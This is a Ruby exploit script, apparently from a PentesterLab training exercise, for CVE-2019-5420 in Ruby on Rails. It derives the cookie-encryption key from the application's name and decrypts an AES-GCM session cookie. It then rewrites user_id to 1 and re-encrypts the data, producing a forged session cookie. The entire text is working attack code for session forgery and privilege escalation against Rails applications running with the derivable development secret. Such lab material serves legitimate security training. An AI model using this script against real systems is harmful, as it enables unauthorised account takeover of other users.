# CVE-2019-5420 from Pentesterlab exercise

require 'base64'
require 'cgi'
require 'uri'
require 'openssl'
require 'json'

# decode the cookie
# vaule of session name is "PentesterLab"
cookie = CGI.unescape "VALUE_OF_THE_COOKIE"  # put in the value of your cookie here

def secret
    secret = Digest::MD5.hexdigest("PentesterLab::Application") # the name of the ruby on rails application, either bruteforce or have to be known directly  
    OpenSSL::PKCS5.pbkdf2_hmac_sha1(secret, "authenticated encrypted cookie", 1000, 32)
end

cipher = OpenSSL::Cipher.new("aes-256-gcm")
  encrypted_data, iv, auth_tag = cookie.split("--".freeze).map { |v| ::Base64.strict_decode64(v) }

cipher.decrypt
cipher.key=secret
cipher.iv=iv
cipher.auth_tag=auth_tag
cipher.auth_data=""

decrypted_data=cipher.update(encrypted_data)
decrypted_data<<cipher.final

puts decrypted_data

data = JSON.parse decrypted_data
data['user_id']=1
cipher.encrypt
cipher.key = secret
iv = cipher.random_iv
cipher.auth_data = ""

encrypted_data = cipher.update(data.to_json)
encrypted_data << cipher.final

newCookie = "#{Base64.strict_encode64 encrypted_data}--#{::Base64.strict_encode64 iv}"
newCookie = "#{newCookie}--#{::Base64.strict_encode64 cipher.auth_tag}"
puts "Your new cookie:"
puts CGI.escape(newCookie)
